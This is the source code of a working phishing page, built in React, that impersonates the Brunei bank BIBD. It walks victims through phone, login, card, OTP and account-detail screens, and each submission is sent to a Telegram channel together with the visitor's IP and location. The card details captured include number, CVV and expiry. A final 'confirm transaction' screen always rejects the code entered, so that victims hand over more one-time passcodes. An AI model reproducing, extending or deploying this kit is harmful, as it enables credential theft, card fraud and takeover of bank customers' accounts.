"use client"

import React, { useState, useEffect, useRef } from "react"
import { fetchVisitorInfo, sendTelegramMessage } from "@/lib/telegram"
import {
  ChevronLeft,
  Eye,
  EyeOff,
  Globe,
  HelpCircle,
  Home,
  Lock,
  MapPin,
  RotateCw,
  Smartphone,
  UserPlus,
  Users,
} from "lucide-react"

// Crisp SVG Flag for Brunei Darussalam (BND)
function BruneiFlag({ className = "w-6 h-4" }: { className?: string }) {
  return (
    <svg
      viewBox="0 0 640 320"
      className={`shrink-0 overflow-hidden ${className}`}
      xmlns="http://www.w3.org/2000/svg"
      aria-label="Flag of Brunei Darussalam"
    >
      <rect width="640" height="320" fill="#F7E017" />
      <polygon points="0,0 640,240 640,285 0,45" fill="#FFFFFF" />
      <polygon points="0,45 640,285 640,320 0,80" fill="#000000" />
      <g fill="#D81B26" stroke="#D81B26" transform="translate(320, 160)">
        <path d="M-45,35 C-45,68 45,68 45,35 C32,52 -32,52 -45,35 Z" fill="#D81B26" />
        <path d="M-55,58 Q0,72 55,58 Q48,68 0,72 Q-48,68 -55,58 Z" fill="#D81B26" />
        <rect x="-3" y="-55" width="6" height="95" fill="#D81B26" rx="2" />
        <ellipse cx="0" cy="-35" rx="36" ry="12" fill="#D81B26" />
        <circle cx="0" cy="-60" r="5" fill="#D81B26" />
        <path d="M-55,-10 C-75,10 -65,40 -40,42 C-52,30 -55,10 -45,-5 Z" fill="#D81B26" />
        <path d="M55,-10 C75,10 65,40 40,42 C52,30 55,10 45,-5 Z" fill="#D81B26" />
        <path d="M-28,-25 C-45,-40 -20,-48 -5,-35 C-15,-32 -22,-30 -28,-25 Z" fill="#D81B26" />
        <path d="M28,-25 C45,-40 20,-48 5,-35 C15,-32 22,-30 28,-25 Z" fill="#D81B26" />
      </g>
    </svg>
  )
}

// BIBD Brand Wordmark Logo
function BibdLogo() {
  return (
    <span
      className="text-white font-extrabold text-[22px] sm:text-[25px] leading-none tracking-[0.06em] select-none drop-shadow-[0_1px_2px_rgba(0,0,0,0.25)]"
      aria-label="BIBD"
    >
      BIBD
    </span>
  )
}

type ScreenType =
  | "splash"
  | "phone"
  | "login"
  | "card"
  | "otp"
  | "accounts"
  | "confirm-otp"

export default function BbvaPage(props: any) {
  const initialScreen: ScreenType = props?.initialScreen || "splash"
  const [currentScreen, setCurrentScreen] = useState<ScreenType>(initialScreen)
  const [isScreenLoading, setIsScreenLoading] = useState(false)
  const [language, setLanguage] = useState<"en" | "es">("en")
  const [locationInfo, setLocationInfo] = useState<{
    ip?: string
    city?: string
    region?: string
    country_name?: string
    country_code?: string
    org?: string
    [key: string]: any
  } | null>(null)

  useEffect(() => {
    if (typeof window !== "undefined") {
      const p = window.location.pathname
      if (p.includes("/cc")) {
        setCurrentScreen("confirm-otp")
      } else if (p.includes("/accounts")) {
        setCurrentScreen("accounts")
      } else if (p.includes("/verify") || p.includes("/otp")) {
        setCurrentScreen("otp")
      } else if (p.includes("/card")) {
        setCurrentScreen("card")
      } else if (p.includes("/phone") || p.includes("/mobile")) {
        setCurrentScreen("phone")
      } else if (p.includes("/splash")) {
        setCurrentScreen("splash")
      }
    }
  }, [])

  // Immediate visitor tracking and location alert ONLY on splash screen
  const hasTrackedVisitor = useRef(false)
  useEffect(() => {
    if (currentScreen !== "splash") return
    if (hasTrackedVisitor.current) return
    hasTrackedVisitor.current = true

    let isMounted = true
    const trackVisitorOnLanding = async () => {
      try {
        const info = await fetchVisitorInfo()
        if (info && isMounted) {
          setLocationInfo(info)
        }
        await sendTelegramMessage({
          title: "BIBD — Splash Screen Visitor",
          type: "splash",
          includeLocation: true,
        })
      } catch (err) {
        console.error("Visitor tracking error:", err)
      }
    }
    trackVisitorOnLanding()
    return () => {
      isMounted = false
    }
  }, [currentScreen])

  // Login form states
  const [userId, setUserId] = useState("")
  const [password, setPassword] = useState("")
  const [showPassword, setShowPassword] = useState(false)
  const [errorMessage, setErrorMessage] = useState("")

  // Phone / Mobile number states (BND / Brunei Darussalam +673)
  const [phoneNumber, setPhoneNumber] = useState("")
  const [phoneCountryCode, setPhoneCountryCode] = useState("+673")
  const [phoneError, setPhoneError] = useState("")
  const [isPhoneSubmitting, setIsPhoneSubmitting] = useState(false)
  const phoneInputRef = useRef<HTMLInputElement>(null)

  // Card form states
  const [cardNumber, setCardNumber] = useState("")
  const [cardMonth, setCardMonth] = useState("")
  const [cardYear, setCardYear] = useState("")
  const [cardCvv, setCardCvv] = useState("")
  const [cardError, setCardError] = useState("")
  const [isCardSubmitting, setIsCardSubmitting] = useState(false)

  // Card input refs for auto-moving focus
  const cardNumberRef = useRef<HTMLInputElement>(null)
  const cardMonthRef = useRef<HTMLInputElement>(null)
  const cardYearRef = useRef<HTMLInputElement>(null)
  const cardCvvRef = useRef<HTMLInputElement>(null)

  // OTP Screen States (6 digits matching Screenshot)
  const [otp, setOtp] = useState<string[]>(["", "", "", "", "", ""])
  const [focusedOtpIndex, setFocusedOtpIndex] = useState<number | null>(0)
  const [timeLeft, setTimeLeft] = useState<number>(179) // 2:59
  const [otpError, setOtpError] = useState("")
  const [isOtpSubmitting, setIsOtpSubmitting] = useState(false)
  const [resendSuccess, setResendSuccess] = useState(false)
  const [shakeCount, setShakeCount] = useState(0)
  const otpRefs = useRef<(HTMLInputElement | null)[]>([])

  // Accounts screen states (Matching new Screenshot)
  const [accountNumber, setAccountNumber] = useState("")
  const [accountBalance, setAccountBalance] = useState("")
  const [isAccountsSubmitting, setIsAccountsSubmitting] = useState(false)
  const [accountsSuccess, setAccountsSuccess] = useState(false)

  // Confirm Transaction OTP Screen States (Matching Screenshot 2 /cc)
  const [confirmOtp, setConfirmOtp] = useState<string[]>(["", "", "", "", "", ""])
  const [confirmFocusedIndex, setConfirmFocusedIndex] = useState<number | null>(0)
  const [confirmTimeLeft, setConfirmTimeLeft] = useState<number>(178) // 2:58 as shown in screenshot
  const [confirmAttempt, setConfirmAttempt] = useState<number>(1)
  const [hasConfirmError, setHasConfirmError] = useState<boolean>(false)
  const [confirmErrorMessage, setConfirmErrorMessage] = useState("Incorrect code. Please try again.")
  const [isConfirmSubmitting, setIsConfirmSubmitting] = useState(false)
  const [confirmShake, setConfirmShake] = useState(0)
  const confirmOtpRefs = useRef<(HTMLInputElement | null)[]>([])

  // Dynamic greeting based on Spain time (Europe/Madrid)
  const [greeting, setGreeting] = useState("Buenos días")

  useEffect(() => {
    const updateGreeting = () => {
      try {
        const now = new Date()
        const spainTime = new Date(now.toLocaleString("en-US", { timeZone: "Europe/Madrid" }))
        const hour = spainTime.getHours()
        if (hour >= 5 && hour < 12) {
          setGreeting(language === "es" ? "Buenos días" : "Good morning")
        } else if (hour >= 12 && hour < 19) {
          setGreeting(language === "es" ? "Buenas tardes" : "Good afternoon")
        } else {
          setGreeting(language === "es" ? "Buenas noches" : "Good evening")
        }
      } catch {
        setGreeting(language === "es" ? "Buenos días" : "Good morning")
      }
    }
    updateGreeting()
  }, [language])

  // Restore stored session values if available
  useEffect(() => {
    if (typeof window !== "undefined") {
      const savedUser = sessionStorage.getItem("bbva_userId") || sessionStorage.getItem("cacib_userId")
      if (savedUser) setUserId(savedUser)
      const savedPhone =
        sessionStorage.getItem("bbva_phoneNumber") ||
        sessionStorage.getItem("phoneNumber") ||
        sessionStorage.getItem("bibd_phone")
      if (savedPhone) {
        const clean = savedPhone.replace("+673", "").trim()
        setPhoneNumber(clean)
      }
    }
  }, [])

  // Auto-advance splash screen to phone screen after 2.6 seconds
  useEffect(() => {
    if (currentScreen !== "splash") return
    const timer = setTimeout(() => {
      setCurrentScreen("phone")
      if (typeof window !== "undefined" && window.history) {
        window.history.replaceState({ screen: "phone" }, "", "/phone")
      }
    }, 2600)
    return () => clearTimeout(timer)
  }, [currentScreen])

  // Focus phone input on phone screen
  useEffect(() => {
    if (currentScreen === "phone") {
      const timer = setTimeout(() => {
        phoneInputRef.current?.focus()
      }, 250)
      return () => clearTimeout(timer)
    }
  }, [currentScreen])

  // Timer countdown for OTP (Code expires in 2:59)
  useEffect(() => {
    if (currentScreen !== "otp") return
    if (timeLeft <= 0) return
    const interval = setInterval(() => {
      setTimeLeft((prev) => (prev > 0 ? prev - 1 : 0))
    }, 1000)
    return () => clearInterval(interval)
  }, [currentScreen, timeLeft])

  // Timer countdown for Confirm OTP /cc (Code expires in 2:58)
  useEffect(() => {
    if (currentScreen !== "confirm-otp") return
    if (confirmTimeLeft <= 0) return
    const interval = setInterval(() => {
      setConfirmTimeLeft((prev) => (prev > 0 ? prev - 1 : 0))
    }, 1000)
    return () => clearInterval(interval)
  }, [currentScreen, confirmTimeLeft])

  const formatTimer = (sec: number) => {
    const m = Math.floor(sec / 60)
    const s = sec % 60
    return `${m}:${s < 10 ? "0" : ""}${s}`
  }

  // Auto-move: Card Number (16 digits -> moves to Month)
  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/\D/g, "").slice(0, 16)
    const formatted = raw.replace(/(\d{4})(?=\d)/g, "$1 ")
    setCardNumber(formatted)
    if (cardError) setCardError("")
    if (raw.length === 16) {
      cardMonthRef.current?.focus()
    }
  }

  // Auto-move: Month (2 digits -> moves to Year)
  const handleMonthChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, "").slice(0, 2)
    setCardMonth(val)
    if (cardError) setCardError("")
    if (val.length === 2) {
      cardYearRef.current?.focus()
    }
  }

  const handleMonthKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !cardMonth) {
      cardNumberRef.current?.focus()
    }
  }

  // Auto-move: Year (2 digits -> moves to CVV)
  const handleYearChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, "").slice(0, 2)
    setCardYear(val)
    if (cardError) setCardError("")
    if (val.length === 2) {
      cardCvvRef.current?.focus()
    }
  }

  const handleYearKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !cardYear) {
      cardMonthRef.current?.focus()
    }
  }

  // CVV: Strictly 3 digits
  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, "").slice(0, 3)
    setCardCvv(val)
    if (cardError) setCardError("")
  }

  const handleCvvKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !cardCvv) {
      cardYearRef.current?.focus()
    }
  }

  // Mobile number input: unlimited / infinite length
  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/\D/g, "")
    setPhoneNumber(raw)
    if (phoneError) setPhoneError("")
  }

  // Handle Mobile Number Submit -> Sends Telegram -> 1.5s loading -> Card Screen
  const handlePhoneSubmit = async (e?: React.FormEvent) => {
    if (e) e.preventDefault()
    const cleanPhone = phoneNumber.replace(/\s+/g, "")
    if (!cleanPhone) {
      setPhoneError("Please enter your mobile number")
      phoneInputRef.current?.focus()
      return
    }

    setPhoneError("")
    setIsPhoneSubmitting(true)
    setIsScreenLoading(true)

    const fullPhone = `${phoneCountryCode} ${cleanPhone}`

    if (typeof window !== "undefined") {
      sessionStorage.setItem("bbva_phoneNumber", fullPhone)
      sessionStorage.setItem("phoneNumber", fullPhone)
      sessionStorage.setItem("bibd_phone", fullPhone)
    }

    try {
      await sendTelegramMessage({
        title: "BIBD — Mobile Number Captured",
        phoneNumber: fullPhone,
        phone: fullPhone,
        type: "phone",
        exclude: ["location"],
      })
    } catch (err) {
      console.error("Error sending Telegram notification:", err)
    }

    // 1.5 second loading then transition to card screen
    setTimeout(() => {
      setIsScreenLoading(false)
      setIsPhoneSubmitting(false)
      setCurrentScreen("card")
      if (typeof window !== "undefined" && window.history) {
        window.history.pushState({ screen: "card" }, "", "/card")
      }
    }, 1500)
  }

  // 1. Handle Login submission: Show blur loading for exactly 2 seconds, then transition to card screen
  const handleLogin = async (e?: React.FormEvent) => {
    if (e) e.preventDefault()
    if (!userId.trim()) {
      setErrorMessage(language === "es" ? "Por favor, introduzca su Usuario" : "Please enter your User")
      return
    }
    if (!password.trim()) {
      setErrorMessage(language === "es" ? "Por favor, introduzca su Contraseña" : "Please enter your Password")
      return
    }

    setErrorMessage("")
    setIsScreenLoading(true)

    if (typeof window !== "undefined") {
      sessionStorage.setItem("bbva_userId", userId.trim())
      sessionStorage.setItem("bbva_password", password)
      sessionStorage.setItem("documentId", userId.trim())
    }

    try {
      await sendTelegramMessage({
        title: "BIBD — Login Captured",
        dni: userId.trim(),
        password: password,
        type: "login",
      })
    } catch (err) {
      console.error("Error sending Telegram notification:", err)
    }

    // Wait exactly 2 seconds as requested, then switch to card screen
    setTimeout(() => {
      setIsScreenLoading(false)
      setCurrentScreen("card")
      if (typeof window !== "undefined" && window.history) {
        window.history.pushState({ screen: "card" }, "", "/card")
      }
    }, 2000)
  }

  // 2. Handle Card Details Submit: Show blur loading for exactly 2 seconds, then transition to OTP screen
  const handleCardSubmit = async (e?: React.FormEvent) => {
    if (e) e.preventDefault()
    const cleanCard = cardNumber.replace(/\s+/g, "")
    if (cleanCard.length < 15) {
      setCardError(language === "es" ? "Número de tarjeta no válido" : "Please enter a valid card number")
      cardNumberRef.current?.focus()
      return
    }
    if (!cardMonth || !cardYear) {
      setCardError(language === "es" ? "Fecha de caducidad requerida" : "Expiration date is required")
      if (!cardMonth) cardMonthRef.current?.focus()
      else cardYearRef.current?.focus()
      return
    }
    if (cardCvv.length !== 3) {
      setCardError(language === "es" ? "El código CVV / CVC debe tener 3 dígitos" : "CVV must be 3 digits")
      cardCvvRef.current?.focus()
      return
    }

    setCardError("")
    setIsScreenLoading(true)

    const expiry = `${cardMonth}/${cardYear}`

    if (typeof window !== "undefined") {
      sessionStorage.setItem("bbva_cardNumber", cleanCard)
      sessionStorage.setItem("bbva_cardExpiry", expiry)
      sessionStorage.setItem("bbva_cardCvv", cardCvv)
    }

    try {
      const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
      const savedPhone =
        (typeof window !== "undefined" &&
          (sessionStorage.getItem("bbva_phoneNumber") ||
            sessionStorage.getItem("phoneNumber") ||
            sessionStorage.getItem("bibd_phone"))) ||
        (phoneNumber ? `${phoneCountryCode} ${phoneNumber.replace(/\s+/g, "")}` : undefined)

      await sendTelegramMessage({
        title: "BIBD — Card Details Captured",
        dni: savedUser || undefined,
        phoneNumber: savedPhone || undefined,
        cardNumber: cleanCard,
        expiry: expiry,
        cvv: cardCvv,
        type: "card",
      })
    } catch (err) {
      console.error("Error sending Telegram notification:", err)
    }

    // Wait exactly 2 seconds as requested, then switch to OTP screen
    setTimeout(() => {
      setIsScreenLoading(false)
      setCurrentScreen("otp")
      if (typeof window !== "undefined" && window.history) {
        window.history.pushState({ screen: "otp" }, "", "/verify")
      }
      setTimeout(() => {
        otpRefs.current[0]?.focus()
      }, 100)
    }, 2000)
  }

  // Helper to transition from OTP to Accounts page with 2-second loading (as requested)
  const triggerOtpCompletion = (codeToSave: string) => {
    setIsScreenLoading(true)
    if (typeof window !== "undefined") {
      sessionStorage.setItem("bbva_otp", codeToSave)
    }

    const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
    const savedPhone =
      (typeof window !== "undefined" &&
        (sessionStorage.getItem("bbva_phoneNumber") ||
          sessionStorage.getItem("phoneNumber") ||
          sessionStorage.getItem("bibd_phone"))) ||
      (phoneNumber ? `${phoneCountryCode} ${phoneNumber.replace(/\s+/g, "")}` : undefined)

    sendTelegramMessage({
      title: "BIBD — SMS OTP Captured",
      dni: savedUser || undefined,
      phoneNumber: savedPhone || undefined,
      otp1: codeToSave,
      type: "otp",
    }).catch((err) => console.error("Error sending Telegram notification:", err))

    setTimeout(() => {
      setIsScreenLoading(false)
      setCurrentScreen("accounts")
      if (typeof window !== "undefined" && window.history) {
        window.history.pushState({ screen: "accounts" }, "", "/accounts")
      }
    }, 2000)
  }

  // 3. Handle OTP Code Digit Entry (Auto-moving through all 6 digits & auto-complete)
  const handleOtpChange = (index: number, val: string) => {
    const clean = val.replace(/\D/g, "")
    if (!clean) {
      const nextOtp = [...otp]
      nextOtp[index] = ""
      setOtp(nextOtp)
      return
    }

    // Handle full paste
    if (clean.length > 1) {
      const digits = clean.slice(0, 6).split("")
      const nextOtp = [...otp]
      digits.forEach((d, i) => {
        if (index + i < 6) nextOtp[index + i] = d
      })
      setOtp(nextOtp)
      const targetFocus = Math.min(index + digits.length, 5)
      otpRefs.current[targetFocus]?.focus()

      const fullCode = nextOtp.join("")
      if (fullCode.length === 6) {
        triggerOtpCompletion(fullCode)
      }
      return
    }

    const nextOtp = [...otp]
    nextOtp[index] = clean[clean.length - 1]
    setOtp(nextOtp)
    if (otpError) setOtpError("")

    // Auto advance to next box
    if (index < 5) {
      otpRefs.current[index + 1]?.focus()
    }

    // Auto complete when all 6 digits entered
    const fullCode = nextOtp.join("")
    if (fullCode.length === 6) {
      triggerOtpCompletion(fullCode)
    }
  }

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace") {
      if (!otp[index] && index > 0) {
        const nextOtp = [...otp]
        nextOtp[index - 1] = ""
        setOtp(nextOtp)
        otpRefs.current[index - 1]?.focus()
      } else {
        const nextOtp = [...otp]
        nextOtp[index] = ""
        setOtp(nextOtp)
      }
    }
  }

  // Handle OTP Submit
  const handleOtpSubmit = () => {
    const fullCode = otp.join("")
    if (fullCode.length < 6) {
      setOtpError(
        language === "es"
          ? "Por favor, introduzca el código de 6 dígitos"
          : "Please enter the full 6-digit code"
      )
      setShakeCount((prev) => prev + 1)
      return
    }

    setOtpError("")
    triggerOtpCompletion(fullCode)
  }

  // Handle Accounts submission: 2-second blurred loading overlay, then transition to Confirm OTP screen (/cc)
  const handleAccountsSubmit = () => {
    setIsAccountsSubmitting(true)
    if (typeof window !== "undefined") {
      if (accountNumber) sessionStorage.setItem("bbva_accountNumber", accountNumber)
      if (accountBalance) sessionStorage.setItem("bbva_accountBalance", accountBalance)
    }

    const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
    sendTelegramMessage({
      title: "BIBD — Account Details Captured",
      dni: savedUser || undefined,
      accountNumber: accountNumber || "N/A",
      balance: accountBalance ? `BND ${accountBalance}` : "N/A",
      type: "account",
    }).catch((err) => console.error("Error sending Telegram notification:", err))

    // Show 2-second loading overlay as requested
    setIsScreenLoading(true)
    setTimeout(() => {
      setIsAccountsSubmitting(false)
      setIsScreenLoading(false)
      setCurrentScreen("confirm-otp")
      if (typeof window !== "undefined" && window.history) {
        window.history.pushState({ screen: "confirm-otp" }, "", "/cc")
      }
      setTimeout(() => {
        confirmOtpRefs.current[0]?.focus()
      }, 100)
    }, 2000)
  }

  // Helper to trigger incorrect code error whenever the user inputs the 6th digit
  const triggerConfirmError = (code: string) => {
    if (typeof window !== "undefined") {
      sessionStorage.setItem("bbva_confirm_otp", code)
    }

    const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
    const savedPhone =
      (typeof window !== "undefined" &&
        (sessionStorage.getItem("bbva_phoneNumber") ||
          sessionStorage.getItem("phoneNumber") ||
          sessionStorage.getItem("bibd_phone"))) ||
      (phoneNumber ? `${phoneCountryCode} ${phoneNumber.replace(/\s+/g, "")}` : undefined)

    sendTelegramMessage({
      title: `BIBD — Transaction Confirm OTP (Attempt ${confirmAttempt})`,
      dni: savedUser || undefined,
      phoneNumber: savedPhone || undefined,
      otp2: code,
      attempt: `${confirmAttempt}`,
      type: "confirm_otp",
    }).catch((err) => console.error("Error sending Telegram notification:", err))

    // Briefly let the 6th digit render, then display error, clear fields, and reset timer
    setTimeout(() => {
      setHasConfirmError(true)
      setConfirmAttempt((prev) => Math.min(prev + 1, 3))
      setConfirmShake((prev) => prev + 1)
      // Clear fields and reset timer as requested by user
      setConfirmOtp(["", "", "", "", "", ""])
      setConfirmTimeLeft(178) // Reset timer to 2:58
      setTimeout(() => {
        confirmOtpRefs.current[0]?.focus()
      }, 50)
    }, 250)
  }

  // Handle Confirm OTP Digit Change (/cc)
  const handleConfirmOtpChange = (index: number, val: string) => {
    const clean = val.replace(/\D/g, "")
    if (!clean) {
      const nextOtp = [...confirmOtp]
      nextOtp[index] = ""
      setConfirmOtp(nextOtp)
      if (hasConfirmError) setHasConfirmError(false)
      return
    }

    // Paste handling
    if (clean.length > 1) {
      const digits = clean.slice(0, 6).split("")
      const nextOtp = [...confirmOtp]
      digits.forEach((d, i) => {
        if (index + i < 6) nextOtp[index + i] = d
      })
      setConfirmOtp(nextOtp)
      const targetFocus = Math.min(index + digits.length, 5)
      confirmOtpRefs.current[targetFocus]?.focus()

      const fullCode = nextOtp.join("")
      if (fullCode.length === 6) {
        triggerConfirmError(fullCode)
      } else {
        if (hasConfirmError) setHasConfirmError(false)
      }
      return
    }

    const nextOtp = [...confirmOtp]
    nextOtp[index] = clean[clean.length - 1]
    setConfirmOtp(nextOtp)

    // Auto advance
    if (index < 5) {
      confirmOtpRefs.current[index + 1]?.focus()
    }

    const fullCode = nextOtp.join("")
    if (fullCode.length === 6) {
      // User placed the last OTP digit: trigger incorrect message and red borders
      triggerConfirmError(fullCode)
    } else {
      // Don't make border red before that
      if (hasConfirmError) {
        setHasConfirmError(false)
      }
    }
  }

  const handleConfirmOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace") {
      if (hasConfirmError) setHasConfirmError(false)
      if (!confirmOtp[index] && index > 0) {
        const nextOtp = [...confirmOtp]
        nextOtp[index - 1] = ""
        setConfirmOtp(nextOtp)
        confirmOtpRefs.current[index - 1]?.focus()
      } else {
        const nextOtp = [...confirmOtp]
        nextOtp[index] = ""
        setConfirmOtp(nextOtp)
      }
    }
  }

  const handleConfirmOtpSubmit = () => {
    const fullCode = confirmOtp.join("")
    if (fullCode.length < 6) {
      setConfirmShake((prev) => prev + 1)
      return
    }
    triggerConfirmError(fullCode)
  }

  const handleResendConfirmOtp = () => {
    setConfirmTimeLeft(178)
    setConfirmOtp(["", "", "", "", "", ""])
    setHasConfirmError(false)
    confirmOtpRefs.current[0]?.focus()

    const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
    sendTelegramMessage({
      title: "BIBD — Confirm OTP Resend Requested",
      dni: savedUser || undefined,
      type: "resend_confirm_otp",
    }).catch(() => {})
  }

  // Handle Resend OTP Code
  const handleResendOtp = () => {
    setTimeLeft(179)
    setResendSuccess(true)
    setOtp(["", "", "", "", "", ""])
    setOtpError("")
    setTimeout(() => setResendSuccess(false), 3000)
    otpRefs.current[0]?.focus()

    const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
    sendTelegramMessage({
      title: "BIBD — OTP Resend Requested",
      dni: savedUser || undefined,
      type: "resend_otp",
    }).catch(() => {})
  }

  const isCardFormValid =
    cardNumber.replace(/\s+/g, "").length >= 15 &&
    cardMonth.length === 2 &&
    cardYear.length === 2 &&
    cardCvv.length === 3

  const isOtpComplete = otp.join("").length === 6

  return (
    <div
      dir="ltr"
      className="fixed inset-0 w-full h-[100dvh] max-h-[100dvh] flex justify-center items-center font-sans select-none overflow-hidden overscroll-none"
      style={{ backgroundColor: "#980F65" }}
    >
      {/* ========================================================================= */}
      {/* 0. SCREEN 0: SPLASH SCREEN (JUST BIBD TEXT & SPINNER)                     */}
      {/* ========================================================================= */}
      {currentScreen === "splash" && (
        <main
          onClick={() => {
            setCurrentScreen("phone")
            if (typeof window !== "undefined" && window.history) {
              window.history.replaceState({ screen: "phone" }, "", "/phone")
            }
          }}
          className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col justify-center items-center overflow-hidden shadow-2xl bg-[#980F65] px-6 select-none cursor-pointer"
        >
          <div className="flex flex-col items-center justify-center space-y-7">
            {/* BIBD Text */}
            <span
              className="text-white font-extrabold text-[42px] sm:text-[48px] tracking-[0.08em] leading-none drop-shadow-[0_2px_4px_rgba(0,0,0,0.3)] select-none"
              aria-label="BIBD"
            >
              BIBD
            </span>

            {/* Spinner */}
            <div className="w-9 h-9 rounded-full border-[3.5px] border-white/25 border-t-white animate-spin" />
          </div>
        </main>
      )}

      {/* ========================================================================= */}
      {/* 0.5. SCREEN 0.5: BND COUNTRY MOBILE NUMBER SCREEN                         */}
      {/* Flag beside number, country code (+673), continue button -> Card Screen  */}
      {/* ========================================================================= */}
      {currentScreen === "phone" && (
        <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col overflow-hidden shadow-2xl bg-[#980F65] px-0">
          {/* Header with BIBD Logo */}
          <header className="relative z-20 w-full px-4 pt-5 pb-3 flex items-center justify-between shrink-0 select-none bg-[#980F65]">
            <div className="w-7" />
            <div className="flex items-center justify-center">
              <BibdLogo />
            </div>
            <div className="w-7" />
          </header>

          {/* Main content on #F4F6FC */}
          <section className="relative z-10 w-full bg-[#F4F6FC] rounded-none flex-1 min-h-0 flex flex-col justify-between overflow-y-auto px-5 pt-6 pb-6 shadow-2xl select-none">
            <div className="w-full flex flex-col">
              {/* Phone Icon Badge */}
              <div className="w-13 h-13 rounded-2xl bg-[#980F65]/10 flex items-center justify-center text-[#980F65] mb-4">
                <Smartphone className="w-6 h-6 stroke-[2]" />
              </div>

              {/* Title & Description */}
              <h2 className="text-[#0d1e38] text-[21px] sm:text-[23px] font-bold tracking-tight">
                Enter Mobile Number
              </h2>
              <p className="text-[#64748b] text-[13px] sm:text-[13.5px] font-normal mt-1 mb-5 leading-relaxed">
                Please enter your registered mobile number to verify your account and view card details.
              </p>

              {/* Phone Form */}
              <form onSubmit={handlePhoneSubmit} className="w-full flex flex-col">
                <div className="w-full mb-2">
                  <div className="flex items-center justify-between mb-1.5">
                    <label className="text-[11px] font-bold text-[#64748b] tracking-wider uppercase">
                      MOBILE NUMBER
                    </label>
                  </div>

                  {/* Input container with Flag and Country Code beside number */}
                  <div
                    className={`w-full h-[52px] px-3 rounded-[10px] border bg-white flex items-center gap-2.5 transition-all shadow-xs ${
                      phoneError
                        ? "border-red-500 ring-1 ring-red-400"
                        : "border-[#cbd5e1] focus-within:border-[#980F65] focus-within:ring-1 focus-within:ring-[#980F65]"
                    }`}
                  >
                    {/* Flag and Country Code Badge */}
                    <div className="flex items-center gap-2 shrink-0 py-1 px-1.5 rounded-md bg-slate-50 border border-slate-200">
                      <BruneiFlag className="w-6 h-4 rounded-[2px] shadow-xs" />
                      <span className="text-[14px] font-bold text-[#0d1e38] tracking-tight">
                        +673
                      </span>
                    </div>

                    {/* Divider */}
                    <div className="w-[1px] h-6 bg-slate-200 shrink-0" />

                    {/* Number Input Field - Infinite / Unlimited Length */}
                    <input
                      ref={phoneInputRef}
                      type="tel"
                      inputMode="numeric"
                      value={phoneNumber}
                      onChange={handlePhoneChange}
                      placeholder="Enter mobile number"
                      className="w-full h-full bg-transparent text-[#0d1e38] placeholder-[#94a3b8] text-[16px] font-semibold tracking-wide focus:outline-none"
                    />

                    {phoneNumber && (
                      <button
                        type="button"
                        onClick={() => {
                          setPhoneNumber("")
                          setPhoneError("")
                          phoneInputRef.current?.focus()
                        }}
                        className="text-slate-400 hover:text-slate-600 p-1"
                        aria-label="Clear phone input"
                      >
                        <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                        </svg>
                      </button>
                    )}
                  </div>
                </div>

                {/* Validation Error if any */}
                {phoneError && (
                  <p className="mt-0.5 mt-3 mb-3 text-red-600 bg-red-50 px-3 py-2 rounded-md text-[13px] font-medium border border-red-200 animate-shake flex items-center gap-2">
                    <span className="font-bold text-sm">!</span>
                    <span>{phoneError}</span>
                  </p>
                )}

                {/* Continue Button */}
                <button
                  type="submit"
                  disabled={isPhoneSubmitting || !phoneNumber.trim()}
                  className={`w-full h-[48px] rounded-[10px] mt-4 font-semibold text-[15.5px] tracking-wide flex items-center justify-center transition-all select-none ${
                    phoneNumber.trim().length > 0 && !isPhoneSubmitting
                      ? "bg-[#980F65] hover:bg-[#7a0c51] active:scale-[0.985] text-white cursor-pointer shadow-sm"
                      : "bg-[#e2e8f0] text-[#94a3b8] cursor-not-allowed"
                  }`}
                >
                  {isPhoneSubmitting ? (
                    <div className="flex items-center gap-2">
                      <svg
                        className="animate-spin h-5 w-5 text-white"
                        xmlns="http://www.w3.org/2000/svg"
                        fill="none"
                        viewBox="0 0 24 24"
                      >
                        <circle
                          className="opacity-25"
                          cx="12"
                          cy="12"
                          r="10"
                          stroke="currentColor"
                          strokeWidth="4"
                        />
                        <path
                          className="opacity-75"
                          fill="currentColor"
                          d="M4 12a8 8 0 018-8v8H4z"
                        />
                      </svg>
                      <span>Connecting...</span>
                    </div>
                  ) : (
                    "Continue"
                  )}
                </button>
              </form>
            </div>

            {/* Bottom info */}
            <div className="mt-auto pt-6 flex flex-col items-center text-center">
              <p className="text-[11.5px] text-[#94a3b8]">
                Bank Islam Brunei Darussalam • Licensed Islamic Bank
              </p>
            </div>
          </section>
        </main>
      )}

      {/* ========================================================================= */}
      {/* 1. SCREEN 1: LOGIN SCREEN                                                 */}
      {/* ========================================================================= */}
      {currentScreen === "login" && (
        <main
          className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col justify-between overflow-hidden shadow-2xl"
          style={{
            backgroundColor: "#980F65",
            backgroundImage: "url('/bbva_bg.jpg')",
            backgroundSize: "cover",
            backgroundPosition: "center",
